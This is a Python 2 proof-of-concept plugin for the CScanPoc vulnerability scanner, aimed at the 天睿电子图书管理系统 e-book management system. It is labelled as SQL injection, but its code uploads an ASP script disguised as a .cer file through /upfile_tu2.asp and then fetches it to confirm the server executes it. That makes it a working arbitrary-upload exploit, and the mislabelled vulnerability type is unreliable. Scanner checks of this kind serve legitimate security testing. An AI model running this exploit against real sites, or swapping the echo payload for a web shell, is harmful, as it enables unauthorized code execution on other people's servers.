# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = 'f94cc140-ad9e-4132-87f0-39d9deaa9776'
    name = '天睿电子图书管理系统系统 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-09-22'  # 漏洞公布时间
    desc = '''
        天睿电子图书管理系统系统 /upfile_tu2.asp?id=1 SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0121549
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = '天睿电子图书管理系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b918b5dc-6e65-44e1-a861-af3ae034202c'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + '/upfile_tu2.asp?id=1'
            content_type = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryriebpEo5zuOo08zY'
            data = '''------WebKitFormBoundaryriebpEo5zuOo08zY\r
                Content-Disposition: form-data; name="act"\r
                \r
                upload\r
                ------WebKitFormBoundaryriebpEo5zuOo08zY\r
                Content-Disposition: form-data; name="filepath"\r
                \r
                upimg/\r
                ------WebKitFormBoundaryriebpEo5zuOo08zY\r
                Content-Disposition: form-data; name="file1"; filename="test.cer"\r
                Content-Type: application/x-x509-ca-cert\r
                \r
                <%\r
                    a = "WtFhhh"\r
                    b = "HHHwTf"\r
                    Response.Write(a+b)\r
                %>\r
                ------WebKitFormBoundaryriebpEo5zuOo08zY\r
                Content-Disposition: form-data; name="Submit"\r
                \r
                · 提交 ·\r
                ------WebKitFormBoundaryriebpEo5zuOo08zY--\r
                '''
            #proxy = ('127.0.0.1', 8887)
            code, head, res, err, _ = hh.http(url, post=data, header=content_type)
            if code != 200:
                return False
            m = re.search(r'=>\s*(upimg/[\d-]*\.cer)\s*', res)
            if not m:
                return False
            verify = arg + m.group(1)
            code, head, res, err, _ = hh.http(verify)
            if(code == 200) and ("WtFhhhHHHwTf" in res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()